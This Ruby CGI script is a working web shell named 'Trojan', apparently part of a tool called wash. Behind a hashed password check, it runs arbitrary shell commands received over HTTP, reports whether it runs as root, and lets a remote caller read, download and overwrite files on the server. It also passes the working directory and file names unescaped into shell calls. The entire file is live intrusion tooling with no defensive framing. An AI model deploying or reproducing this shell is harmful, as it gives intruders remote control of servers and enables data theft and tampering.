#!/usr/bin/env ruby

require 'cgi'
require 'digest/sha1'
require 'json'

require 'logger'
$logger = Logger.new('/tmp/wash.log')

class Trojan
    attr_accessor :cgi, :cwd, :response

    def initialize params
        @cgi      = params[:cgi]
        @cwd      = (@cgi.params['args[cwd]'].first.empty?) ? `pwd`.strip! : @cgi.params['args[cwd]'].first
        @response = {
            'error'  => '',
            'output' => {},
        }

        $logger.debug('cw fucking d: ' + @cwd)
    end

    def process_command
        json = @cgi.params
        send json['action'].first, json
    end

    def shell json
        command                       = json['args[cmd]'].first
        out_lines                     = `cd #{@cwd}; #{command} 2>&1; pwd`.split "\n"
        @response['output']['cwd']    = @cwd = out_lines.pop
        @response['output']['stdout'] = out_lines.join "\n"
        self.send_response
    end

    def send_response
        @response['output']['prompt'] = self.get_prompt_context
        puts @cgi.header('Access-Control-Allow-Origin: *')
        puts @response.to_json
        puts
        exit
    end

    def get_prompt_context
        whoami          = `whoami`.strip!
        hostname        = `hostname`.strip!
        line_terminator = (whoami == 'root') ? '#' : '$';
        return "#{whoami}@#{hostname}:#{@cwd}#{line_terminator}";
    end

    def method_missing method, *args
        @response['error'] = "#{method} unsupported"
        self.send_response
    end

    def payload_feh json
    Dir.chdir @cwd
    img_file = json['args[file]'].first

    if File.readable? img_file
        mime_type = `file --mime-type -b #{img_file}`.strip!
        puts @cgi.header("Content-Type: #{mime_type}")
        puts File.read(img_file)
    else
        puts 'File does not exist.'
    end
    exit
end
def payload_file_down json
    Dir.chdir @cwd
    dl_file = json['args[file]'].first

    if File.exist? dl_file
        puts @cgi.header(
            'Content-Disposition'       => 'attachment; filename=' + File.basename(dl_file),
            'Content-Transfer-Encoding' => 'binary',
        );
        puts File.read(dl_file)
    else
        puts "File does not exist"
    end
end

def payload_file_read json
    Dir.chdir @cwd
    dl_file = json['args[file]'].first

    unless File.readable? dl_file
        @response['error'] = 'File is not readable or does not exist.'
    else
        @response['output'] = {
            'output' => File.read(dl_file),
            'file'   => File.realpath(dl_file),
        }
    end

    self.send_response
end

def payload_file_write json
    Dir.chdir @cwd
    write_file = json['args[file]'].first

    if File.writable? write_file
        File.open(write_file, 'w') {|f| f.write(json['args[data]'].first) }
        @response['output'] = 'Write successful'
    else
        @response['error'] = 'Failed. File may not be writable, or may not exist.'
    end
    self.send_response
end


end

# ---------- Procedural code starts here ----------
cgi  = CGI.new

hash = Digest::SHA1.hexdigest(cgi.params['args[password]'].first + '7474b1554c')
if hash.eql? '8bc32f6888c6794980bc31c1890a95a7538c5a63'
    trojan = Trojan.new({ :cgi => cgi })
    trojan.process_command
else
    puts cgi.header('Access-Control-Allow-Origin: *')
    puts '{"error":"Invalid password."}'
    puts
end
